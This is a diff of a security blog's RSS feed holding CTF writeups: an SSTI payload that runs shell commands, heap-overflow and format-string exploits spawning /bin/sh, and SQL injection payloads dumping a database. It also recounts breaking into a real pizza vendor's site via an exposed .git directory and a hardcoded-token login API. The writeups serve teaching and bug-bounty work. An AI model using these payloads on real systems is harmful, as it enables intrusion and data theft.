 &lt;p&gt;Visiting the website, a well trained eye can directly notice the possibility of an SSTI attack in icecream parameter.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/zbwADG6.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;We thought that it was a typical SSTI task but unfortunately even after getting RCE using the usual jinja2 SSTI payloads we didn&amp;rsquo;t find anything. The first payload we used:&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;{{ &amp;lsquo;&#39;.&lt;strong&gt;class&lt;/strong&gt;.&lt;strong&gt;mro&lt;/strong&gt;[1].&lt;strong&gt;subclasses&lt;/strong&gt;()[270](&amp;lsquo;ls&amp;rsquo;,shell=True,stdout=-1).communicate()}}&lt;/p&gt;
+&lt;p&gt;{{ &amp;lsquo;&amp;rsquo;.&lt;strong&gt;class&lt;/strong&gt;.&lt;strong&gt;mro&lt;/strong&gt;[1].&lt;strong&gt;subclasses&lt;/strong&gt;()[270](&amp;lsquo;ls&amp;rsquo;,shell=True,stdout=-1).communicate()}}&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;After this step we really didn&amp;rsquo;t know what to do, the server used here was Tornado, which is an asynchronous python web server so I started reading its documentation and I noticed that the Main class always inherits from &lt;strong&gt;tornado.web.RequestHandler&lt;/strong&gt;.
 After some digging I got a nice idea , what if we list all the subclasses of Object ( The super class, it&amp;rsquo;s the parent of all classes) Then we will list the subclasses of tornado.web.RequestHandler and finally we will check the globals of &lt;strong&gt;get&lt;/strong&gt; function from MainHadnler class.&lt;/p&gt;
@@ -633,13 +1057,13 @@ After some digging I got a nice idea , what if we list all the subclasses of Obj
 &lt;li&gt;Get the RequestHandler class:&lt;/li&gt;
 &lt;/ul&gt;
 &lt;blockquote&gt;
-&lt;p&gt;{{ &amp;lsquo;&#39;.&lt;strong&gt;class&lt;/strong&gt;.&lt;strong&gt;mro&lt;/strong&gt;[1].&lt;strong&gt;subclasses&lt;/strong&gt;()[363]}}&lt;/p&gt;
+&lt;p&gt;{{ &amp;lsquo;&amp;rsquo;.&lt;strong&gt;class&lt;/strong&gt;.&lt;strong&gt;mro&lt;/strong&gt;[1].&lt;strong&gt;subclasses&lt;/strong&gt;()[363]}}&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;ul&gt;
 &lt;li&gt;Get the MainHandler class which inherits from RequestHandler&lt;/li&gt;
 &lt;/ul&gt;
 &lt;blockquote&gt;
-&lt;p&gt;{{ &amp;lsquo;&#39;.&lt;strong&gt;class&lt;/strong&gt;.&lt;strong&gt;mro&lt;/strong&gt;[1].&lt;strong&gt;subclasses&lt;/strong&gt;()[363].&lt;strong&gt;subclasses&lt;/strong&gt;()[-1]}}&lt;/p&gt;
+&lt;p&gt;{{ &amp;lsquo;&amp;rsquo;.&lt;strong&gt;class&lt;/strong&gt;.&lt;strong&gt;mro&lt;/strong&gt;[1].&lt;strong&gt;subclasses&lt;/strong&gt;()[363].&lt;strong&gt;subclasses&lt;/strong&gt;()[-1]}}&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;And finally we will see the &lt;strong&gt;globals&lt;/strong&gt; of get function ( &lt;strong&gt;&lt;strong&gt;globals&lt;/strong&gt;&lt;/strong&gt; is a reference to the dictionary that holds the function’s global variables ).
 Final payload:&lt;/p&gt;
@@ -656,12 +1080,12 @@ Final payload:&lt;/p&gt;
       <link>https://ahmed-belkahla.me/post/how_i_hacked_a_famous_tunisian_pizza_vendor/</link>
       <pubDate>Wed, 27 May 2020 09:00:00 +0000</pubDate>
       <guid>https://ahmed-belkahla.me/post/how_i_hacked_a_famous_tunisian_pizza_vendor/</guid>
-      <description>&lt;h1 id=&#34;how-i-hacked-a-famous-pizza-vendor-in-tunisia--&#34;&gt;&lt;strong&gt;How i hacked a famous pizza vendor in Tunisia ?&lt;/strong&gt;&lt;/h1&gt;
+      <description>&lt;h1 id=&#34;how-i-hacked-a-famous-pizza-vendor-in-tunisia-&#34;&gt;&lt;strong&gt;How i hacked a famous pizza vendor in Tunisia ?&lt;/strong&gt;&lt;/h1&gt;
 &lt;p&gt;Generally i&amp;rsquo;m not a fan of bug bounty programs but this time i tried to test my skills in some real world scenario and participate to secure some tunisian websites as they lack a lot of things in term of security :D
 It&amp;rsquo;s 11h pm and i was sitting on my laptop like always doing an annoying java homework for school when i felt hungry :(
 and accidentally an X pizza (we will call it X pizza as i was asked to not reveal the company name) ad catched my eye on facebook. I decided to take a look on their website and try to
 find a way to break it.&lt;/p&gt;
-&lt;h2 id=&#34;exploitation-&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
 &lt;p&gt;I started browsing the website and doing some basic recon , it was a typical wordpress website without any catching
 exploits or some really outdated plugins . I have also ran the famous Wpscan and tried to brute force the admin account but unfortunately i got nothing.&lt;/p&gt;
 &lt;p&gt;My next step was trying to explore if there&amp;rsquo;s some insecure code management and Bingo it appeared that the developers forgot the .git directory there, so we can dump the source code of the web app.
@@ -669,7 +1093,7 @@ I used the famous gitdumper and extractor shell scripts to do that and we were s
 This was really some juicy informations but i wanted to explore more , i started reviewing the source code and after a while
 i found an awesome api , it checks a hardcoded token and then using only a phone number as input it logins to the phone number owner account :o&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://i.imgur.com/MqDN2Ai.jpg&#34; alt=&#34;CODE&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;why-do-they-use-it--&#34;&gt;Why do they use it ?&lt;/h3&gt;
+&lt;h3 id=&#34;why-do-they-use-it-&#34;&gt;Why do they use it ?&lt;/h3&gt;
 &lt;p&gt;This api was meant to be accessed only from the call service employees and the developer told me that only some white listed ips were allowed to visit it. It was like a secret hidden backdoor .&lt;/p&gt;
 &lt;p&gt;However using the hardcoded token we can access any account , you may be asking how i found the phone number of a privileged user , the database didn&amp;rsquo;t have any useful informations for this (it was an old DB) so i had to think for a while and finally
 i remembered that i found and old list of orders informations in the uploads directory and usually the first order will be
@@ -695,23 +1119,23 @@ at my previous articles and follow me on twitter for more exciting content :D&lt
       <description>&lt;p&gt;To make sure that i learned something well , i always want to write an article about that topic and it&amp;rsquo;ll be an opportunity to do more researchs about it.
 The last two days our team Fword participated in two CTFs (UMD CTF and WPICTF) and we were among the top 20 teams in both CTFs so GJ guys &amp;lt;3 anyway that&amp;rsquo;s why i decided to choose the best pwn tasks and write these detailed writeups about them to be a great practical introduction for people who want to dive into binary exploitation .&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; This article assumes that you have basic knowledge of assembly and C language&lt;/p&gt;
-&lt;h2 id=&#34;summary-&#34;&gt;Summary&lt;/h2&gt;
+&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
 &lt;p&gt;1- &lt;strong&gt;Jump Not Found&lt;/strong&gt; From UMD CTF : heap based overflow&lt;/p&gt;
 &lt;p&gt;2- &lt;strong&gt;Dorsia3&lt;/strong&gt; From WPI CTF: Format string Vulnerability&lt;/p&gt;
-&lt;h2 id=&#34;jump-not-found-400pts-25-solves-&#34;&gt;Jump Not Found 400pts (25 solves)&lt;/h2&gt;
+&lt;h2 id=&#34;jump-not-found-400pts-25-solves&#34;&gt;Jump Not Found 400pts (25 solves)&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/nerLXcA.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; You can Download the binary 
 &lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/blob/master/UMDCTF%202020/Jump%20Not%20Found/JNF&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;, give it a try alone before reading the writeup that&amp;rsquo;s the best way to LEARN .&lt;/p&gt;
-&lt;h3 id=&#34;tldr-&#34;&gt;TL;DR&lt;/h3&gt;
+&lt;h3 id=&#34;tldr&#34;&gt;TL;DR&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;Exploit a Heap based overflow to overwrite a function address with the Win function address&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;Bypass a little problem of the presence of &amp;ldquo;0x0a&amp;rdquo;(&amp;quot;\n&amp;rdquo;) in the Win function address&lt;/p&gt;
+&lt;p&gt;Bypass a little problem of the presence of &amp;ldquo;0x0a&amp;rdquo;(&amp;quot;\n&amp;quot;) in the Win function address&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id=&#34;introduction-&#34;&gt;Introduction&lt;/h3&gt;
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
 &lt;p&gt;Before diving into the exploitation part , let&amp;rsquo;s talk about the heap section ,you have probably heard or used &lt;strong&gt;malloc&lt;/strong&gt; or &lt;strong&gt;calloc&lt;/strong&gt; functions in C ,
 these functions are used to allocate memory on the heap,it is a region of your computer&amp;rsquo;s memory that is not managed automatically for you and used for dynamic memory allocation, unlike the stack which we dont have full control over it.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/aVPbDZM.png&#34; alt=&#34;SECTIONS&#34;&gt;&lt;/p&gt;
@@ -722,7 +1146,7 @@ these functions are used to allocate memory on the heap,it is a region of your c
 &lt;/blockquote&gt;
 &lt;p&gt;This was in a really abstract way , you can do more research alone if you are interested , there is a lot of ressources in the internet :D&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/7ewvjK7.png&#34; alt=&#34;Allocation&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;exploitation-&#34;&gt;Exploitation&lt;/h3&gt;
+&lt;h3 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h3&gt;
 &lt;p&gt;Let the fun begin now :D after downloading the binary let&amp;rsquo;s do some basic reverse engineering and read carefully its code , i used ghidra for that purpose , you can download it from its official website.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/Ra3YFyG.png&#34; alt=&#34;CODE&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Observing the main function , we can notice that it&amp;rsquo;s allocation two chunks , the first one its size is 0x42 (66 bytes) where our input will be stored and a second chunk which holds an array of function pointers , and based on our input (1 or 2 or 3) the program will call the appropriate function from the heap .&lt;/p&gt;
@@ -753,7 +1177,7 @@ log.info(&amp;quot;Found Flag ! &amp;quot;)
 p.interactive()
 
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;The reason why i wrote *&lt;em&gt;OFFSET=&amp;quot;1&amp;quot;+&amp;quot;A&amp;rdquo;&lt;em&gt;79&lt;/em&gt;&lt;/em&gt; is that if you have read the code carefully we will notice that the choice of the function that will be executed is loaded from the beginning of the chunk (which is logic) so i wanted to do it in one shot.&lt;/p&gt;
+&lt;p&gt;The reason why i wrote *&lt;em&gt;OFFSET=&amp;ldquo;1&amp;rdquo;+&amp;ldquo;A&amp;rdquo;&lt;em&gt;79&lt;/em&gt;&lt;/em&gt; is that if you have read the code carefully we will notice that the choice of the function that will be executed is loaded from the beginning of the chunk (which is logic) so i wanted to do it in one shot.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;        gets(local_20);
         lVar2 = strtol(local_20,&amp;amp;local_28,10);
         *(short *)(local_20 + 0x40) = (short)lVar2;
@@ -773,16 +1197,16 @@ Fortunately observing the assembly code of &lt;strong&gt;jumpToNaboo&lt;/strong&
 &lt;p&gt;And Finally running the exploit will bring the flag for us :D&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/Hzqpy0X.png&#34; alt=&#34;FLAG&#34;&gt;&lt;/p&gt;
 &lt;p&gt;That was a quite simple example of exploiting a heap based overflow thus it was only solved by 25 teams from 321 teams . Let&amp;rsquo;s pass now to the second task which is a format string vulnerability.&lt;/p&gt;
-&lt;h2 id=&#34;dorsia3-250pts-55-solves-&#34;&gt;Dorsia3 250pts (55 solves)&lt;/h2&gt;
+&lt;h2 id=&#34;dorsia3-250pts-55-solves&#34;&gt;Dorsia3 250pts (55 solves)&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/CkCR80H.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; You can Download the binary 
 &lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/blob/master/WPI%20CTF%202020/dorsia3/nanoprint&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt; and the libc 
 &lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/blob/master/WPI%20CTF%202020/dorsia3/libc.so.6&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;, give it a try alone before reading the writeup that&amp;rsquo;s the best way to LEARN .&lt;/p&gt;
-&lt;h3 id=&#34;tldr--1&#34;&gt;TL;DR&lt;/h3&gt;
+&lt;h3 id=&#34;tldr-1&#34;&gt;TL;DR&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;Exploit a format string vulnerability to overwrite the return pointer + Libc one gadget&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id=&#34;introduction--1&#34;&gt;Introduction&lt;/h3&gt;
+&lt;h3 id=&#34;introduction-1&#34;&gt;Introduction&lt;/h3&gt;
 &lt;p&gt;As a quick introduction this is a brief explanation of the format string vulnerability :&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;format string is a type of software vulnerability. Originally thought harmless, format string exploits can be used to crash a program or to execute harmful code. The problem stems from the use of unchecked user input as the format string parameter in certain C functions that perform formatting, such as printf(). A malicious user may use the %s and %x format tokens, among others, to print data from the call stack or possibly other locations in memory. One may also write arbitrary data to arbitrary locations using the %n format token, which commands printf() and similar functions to write the number of bytes formatted to an address stored on the stack.
@@ -791,7 +1215,7 @@ Fortunately observing the assembly code of &lt;strong&gt;jumpToNaboo&lt;/strong&
 &lt;p&gt;A quick Example :&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/1ImQ6zG.png&#34; alt=&#34;FMT&#34;&gt;&lt;/p&gt;
 &lt;p&gt;If things are not clear for you you can search for more ressources about format string vulnerabilities . Let the hack begin now :D&lt;/p&gt;
-&lt;h3 id=&#34;exploitation--1&#34;&gt;Exploitation&lt;/h3&gt;
+&lt;h3 id=&#34;exploitation-1&#34;&gt;Exploitation&lt;/h3&gt;
 &lt;p&gt;In this task we are given the source code of the task , the binary and the libc .&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/26HRSAR.png&#34; alt=&#34;CODE&#34;&gt;&lt;/p&gt;
 &lt;p&gt;As you can see we can notice the format string vulnerability in the printf function and we have a leak of our buffer address in the stack and the system function.&lt;/p&gt;
@@ -841,7 +1265,7 @@ p.interactive()
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/Ly6WJjh.png&#34; alt=&#34;LIBC&#34;&gt;&lt;/p&gt;
 &lt;p&gt;After some debugging with gdb i figured that the constraints of this magic gadget are verified so we will use it in our exploit&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;0x3d0e0 execve(&amp;quot;/bin/sh&amp;rdquo;, esp+0x40, environ)&lt;/p&gt;
+&lt;p&gt;0x3d0e0 execve(&amp;quot;/bin/sh&amp;quot;, esp+0x40, environ)&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;blockquote&gt;
 &lt;p&gt;constraints:&lt;/p&gt;
@@ -901,7 +1325,7 @@ p.interactive()
       <guid>https://ahmed-belkahla.me/post/hackzone-viii/</guid>
       <description>&lt;p&gt;Hello guys , HackZone VIII CTF has ended this morning , i participated with my team Fword and we got the 4th place, here is my writeup for the three web challenges I managed to solve :D&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/xrafZEo.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;babyweb1722pts10-solves-&#34;&gt;&lt;strong&gt;BabyWeb1(722pts)(10 solves)&lt;/strong&gt;&lt;/h1&gt;
+&lt;h1 id=&#34;babyweb1722pts10-solves&#34;&gt;&lt;strong&gt;BabyWeb1(722pts)(10 solves)&lt;/strong&gt;&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/zu1XKQe.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;In this task we are given a platform where we can share a picture with some msg and it generates a password for us to access these details ,there are already some pictures posted by the author, so we have to access them and maybe the flag in the details of one of them.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/9hXA90t.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
@@ -915,7 +1339,7 @@ p.interactive()
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/rywyGg4.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Using this password will give us the details of the picture and the flag if we check the source code :D&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/bpK7N8F.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;insecure884pts4-solves-&#34;&gt;&lt;strong&gt;Insecure(884pts)(4 solves)&lt;/strong&gt;&lt;/h1&gt;
+&lt;h1 id=&#34;insecure884pts4-solves&#34;&gt;&lt;strong&gt;Insecure(884pts)(4 solves)&lt;/strong&gt;&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/ehpXH1T.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;I really had a lot of fun playing this task ,we are given a text to image converter website , as the description said the first part of the flag is due to a misconfiguration so the first thing i thinked about is a bucket misconfig and it was the case.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/lISjgSe.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
@@ -970,7 +1394,7 @@ oReq.send();
 &lt;p&gt;And yees we received an answer :D&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://i.imgur.com/hTbrKXX.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Base64 decoding it will give us the last part of the flag :D I really enjoyed this task so thank you @PsycoR for your efforts&lt;/p&gt;
-&lt;h1 id=&#34;calculator722pts10-solves-&#34;&gt;&lt;strong&gt;Calculator(722pts)(10 solves)&lt;/strong&gt;&lt;/h1&gt;
+&lt;h1 id=&#34;calculator722pts10-solves&#34;&gt;&lt;strong&gt;Calculator(722pts)(10 solves)&lt;/strong&gt;&lt;/h1&gt;
 &lt;p&gt;This task was pretty obvious , we have x and y parameters and the web app calculates their division , if we enter any character we will have the error page and Bingo debug mode is true :D&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/iLqircE.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;We will now leak the Secret key of the app and sign a session cookie that has the attribute &amp;ldquo;is_admin&amp;rdquo; set to True .&lt;/p&gt;
@@ -991,7 +1415,7 @@ oReq.send();
       <link>https://ahmed-belkahla.me/post/midnight-sun-ctfquals/</link>
       <pubDate>Sat, 04 Apr 2020 00:00:00 +0000</pubDate>
       <guid>https://ahmed-belkahla.me/post/midnight-sun-ctfquals/</guid>
-      <description>&lt;h1 id=&#34;pwn170pts-&#34;&gt;&lt;strong&gt;pwn1(70pts)&lt;/strong&gt;&lt;/h1&gt;
+      <description>&lt;h1 id=&#34;pwn170pts&#34;&gt;&lt;strong&gt;pwn1(70pts)&lt;/strong&gt;&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/4fbyzFx.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;It was a ret2libc task , but we had firstly to leak the libc base address using BOF (i leaked it through printf address) than we will return to main and perform our ret2 System :D
 here is my exploit, if you have any questions you can contact me on twitter @BelkahlaAhmed1&lt;/p&gt;
@@ -1026,7 +1450,7 @@ p.interactive()
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Check Task files ** 
 &lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/tree/master/Midnight%20Sun%20CTF%202020%20Quals/pwn1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt; **&lt;/p&gt;
-&lt;h1 id=&#34;pwn280pts-&#34;&gt;&lt;strong&gt;pwn2(80pts)&lt;/strong&gt;&lt;/h1&gt;
+&lt;h1 id=&#34;pwn280pts&#34;&gt;&lt;strong&gt;pwn2(80pts)&lt;/strong&gt;&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/lYjuGsS.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;It was a really fun task , we had a format string vulnerability , so firstly i overwrited the GOT entry of the exit function with main address so we have now an infinite loop and the program will never exit , than using format string we leak the libc base address and than we overwrite the GOT entry of printf with the address of system :D
 Here is my exploit , if you have any questions you can contact me o twitter @BelkahlaAhmed1&lt;/p&gt;
@@ -1093,7 +1517,7 @@ p.interactive()
       <link>https://ahmed-belkahla.me/post/tamuctfpwn/</link>
       <pubDate>Mon, 30 Mar 2020 00:00:00 +0000</pubDate>
       <guid>https://ahmed-belkahla.me/post/tamuctfpwn/</guid>
-      <description>&lt;h2 id=&#34;b64decoder-244pts-&#34;&gt;&lt;strong&gt;B64DECODER (244pts)&lt;/strong&gt;&lt;/h2&gt;
+      <description>&lt;h2 id=&#34;b64decoder-244pts&#34;&gt;&lt;strong&gt;B64DECODER (244pts)&lt;/strong&gt;&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/ZVHG4PA.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;This is wont be a detailed writeup , however in this task we have a clear format string vulnerability (line 23) and a leak of a64l function address&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/EIv7uYX.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
@@ -1126,7 +1550,7 @@ p.interactive()
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/jd78uIm.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Task files &lt;strong&gt;
 &lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/tree/master/TAMU%20CTF/B64DECODER&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;h2 id=&#34;troll-50pts-&#34;&gt;&lt;strong&gt;TROLL (50pts)&lt;/strong&gt;&lt;/h2&gt;
+&lt;h2 id=&#34;troll-50pts&#34;&gt;&lt;strong&gt;TROLL (50pts)&lt;/strong&gt;&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/AgJ7rGR.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;In this task we are supposed to win a game by guessing the next 100 random numbers , looking at the source code we can see the vulnerable gets function , after that we are setting the seed
 value to the time and finally the beginning of the loop and generating the random numbers and questions each time .&lt;/p&gt;
@@ -1184,11 +1608,11 @@ p.interactive()
       <link>https://ahmed-belkahla.me/post/the-after-prequalsecurinetsquals/</link>
       <pubDate>Mon, 23 Mar 2020 00:00:00 +0000</pubDate>
       <guid>https://ahmed-belkahla.me/post/the-after-prequalsecurinetsquals/</guid>
-      <description>&lt;h1 id=&#34;the-after-prequal-971pts-19-solves-&#34;&gt;&lt;strong&gt;The after-Prequal (971pts) (19 Solves)&lt;/strong&gt;&lt;/h1&gt;
+      <description>&lt;h1 id=&#34;the-after-prequal-971pts-19-solves&#34;&gt;&lt;strong&gt;The after-Prequal (971pts) (19 Solves)&lt;/strong&gt;&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/pXLjH4n.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;This task was so fun and i learned new things from it , we are given a website with a search functionality and after testing a single quote injection we had an SQL error , so let&amp;rsquo;s start the exploitation of the famous SQL injection :D&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/B2IbSxr.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
-&lt;p&gt;After the basic enumeration we can notice that these characters are filtered : &lt;strong&gt;[&amp;rdquo; &amp;ldquo;,&amp;quot;-&amp;quot;,&amp;quot;,&amp;quot;]&lt;/strong&gt; so we will use the following bypasses:&lt;/p&gt;
+&lt;p&gt;After the basic enumeration we can notice that these characters are filtered : &lt;strong&gt;[&amp;quot; &amp;ldquo;,&amp;quot;-&amp;rdquo;,&amp;quot;,&amp;quot;]&lt;/strong&gt; so we will use the following bypasses:&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;The white space : &lt;strong&gt;%0A&lt;/strong&gt;&lt;/li&gt;
 &lt;li&gt;The &amp;ldquo;-&amp;rdquo; : we will use &lt;strong&gt;#&lt;/strong&gt; to comment&lt;/li&gt;
@@ -1196,7 +1620,7 @@ p.interactive()
 &lt;/ol&gt;
 &lt;p&gt;This step took me some time , after some tries i succeeded in equilibrating the query :&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A2)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
+&lt;p&gt;?search=&#39;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A2)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/5VSI80e.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;And BINGO ! we succeeded to inject , all we have to do know is to dump the database as usual&lt;/p&gt;
@@ -1204,7 +1628,7 @@ p.interactive()
 &lt;li&gt;Tables:&lt;/li&gt;
 &lt;/ol&gt;
 &lt;blockquote&gt;
-&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Atable_name%0AfRoM%0Ainformation_schema.tables)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
+&lt;p&gt;?search=&#39;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Atable_name%0AfRoM%0Ainformation_schema.tables)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;&lt;strong&gt;Table name&lt;/strong&gt;: secrets&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/m190lNI.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
@@ -1212,13 +1636,13 @@ p.interactive()
 &lt;li&gt;Columns:&lt;/li&gt;
 &lt;/ol&gt;
 &lt;blockquote&gt;
-&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Acolumn_name%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name=&amp;quot;secrets&amp;rdquo;)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
+&lt;p&gt;?search=&#39;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Acolumn_name%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name=&amp;ldquo;secrets&amp;rdquo;)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;The interesting &lt;strong&gt;Column name&lt;/strong&gt; : value&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/TegJtmS.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;And finally :&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Avalue%0Afrom%0Asecrets)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
+&lt;p&gt;?search=&#39;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Avalue%0Afrom%0Asecrets)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/8ycD4ru.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Damn no flag for us :&#39;( but no problem maybe if we just do load_file(&amp;ldquo;flag.txt&amp;rdquo;) we will have the flag ? unfortunately it wont work, in fact it&amp;rsquo;s not that easy and this is the most juicy part of the task xd
@@ -1229,12 +1653,12 @@ i checked the privileges of the current user and the FILE permission was not gra
 &lt;/blockquote&gt;
 &lt;p&gt;So probably the author have set a custom location in the global variable &lt;strong&gt;secure_file_priv&lt;/strong&gt; , let&amp;rsquo;s check its value in @@GLOBAL.secure_file_priv&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A@@GLOBAL.secure_file_priv)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
